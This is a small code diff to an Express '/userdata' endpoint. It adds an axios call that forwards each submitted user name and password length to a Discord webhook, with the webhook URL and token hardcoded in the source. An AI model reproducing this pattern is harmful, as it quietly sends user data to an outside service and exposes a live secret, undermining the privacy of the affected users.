@@ -18,6 +18,14 @@ app.post("/userdata", (req, res, next) => {
     try {
         var data = `user: ${req.body.userName} passwordLength: ${req.body.passwordLength}`
         console.log(data);
+
+        // send webhook to discord
+        const axios = require('axios');
+
+        axios.post('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
+            content: data
+        })
+
         fs.writeFile("result.txt", data, (err) => {
             if (err) console.log(err);
             console.log("Successfully Written to File.");
